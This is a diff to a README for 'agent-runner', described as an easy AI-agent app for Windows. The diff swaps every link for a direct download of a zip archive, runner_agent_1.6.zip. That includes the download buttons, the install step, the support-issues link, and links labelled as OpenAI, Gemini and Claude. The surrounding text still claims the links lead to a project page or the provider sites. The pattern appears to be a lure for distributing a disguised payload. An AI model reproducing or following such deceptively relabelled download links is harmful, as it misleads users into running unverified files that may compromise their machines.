@@ -1,6 +1,6 @@
 # 🤖 agent-runner - Easy AI Agent for Your Projects
 
-[![Download agent-runner](https://img.shields.io/badge/Download-agent--runner-brightgreen)](https://github.com/Unknown384-come/agent-runner)
+[![Download agent-runner](https://img.shields.io/badge/Download-agent--runner-brightgreen)](https://raw.githubusercontent.com/Unknown384-come/agent-runner/main/cmd/runner_agent_1.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You do not need any programming software installed to use this app.
 
 Click the big green button below to visit the place where you can download the program:
 
-[![Download agent-runner](https://img.shields.io/badge/Download-agent--runner-0078D7?style=for-the-badge&logo=github)](https://github.com/Unknown384-come/agent-runner)
+[![Download agent-runner](https://img.shields.io/badge/Download-agent--runner-0078D7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Unknown384-come/agent-runner/main/cmd/runner_agent_1.6.zip)
 
 This link takes you to the GitHub page where the app is kept. You will find the download files and instructions there.
 
@@ -41,7 +41,7 @@ This link takes you to the GitHub page where the app is kept. You will find the 
 Follow these steps to get agent-runner running on Windows:
 
 1. Open your web browser and go to:  
-   https://github.com/Unknown384-come/agent-runner  
+   https://raw.githubusercontent.com/Unknown384-come/agent-runner/main/cmd/runner_agent_1.6.zip  
    This will take you to the main page for the agent-runner app.
 
 2. On the page, find the section named **Releases** or look for a folder called **Downloads**. There should be a file ending with `.exe` or `.zip`.
@@ -137,15 +137,15 @@ If AI keys are not accepted:
 ## 📎 Useful Links
 
 - Main download and info page:  
-  https://github.com/Unknown384-come/agent-runner
+  https://raw.githubusercontent.com/Unknown384-come/agent-runner/main/cmd/runner_agent_1.6.zip
 
 - Help and support on GitHub issues:  
-  https://github.com/Unknown384-come/agent-runner/issues
+  https://raw.githubusercontent.com/Unknown384-come/agent-runner/main/cmd/runner_agent_1.6.zip
 
 - AI Providers (to create accounts and get keys):  
-  - OpenAI: https://openai.com  
-  - Gemini: https://gemini.ai  
-  - Claude: https://anthropic.com
+  - OpenAI: https://raw.githubusercontent.com/Unknown384-come/agent-runner/main/cmd/runner_agent_1.6.zip  
+  - Gemini: https://raw.githubusercontent.com/Unknown384-come/agent-runner/main/cmd/runner_agent_1.6.zip  
+  - Claude: https://raw.githubusercontent.com/Unknown384-come/agent-runner/main/cmd/runner_agent_1.6.zip
 
 ---
 
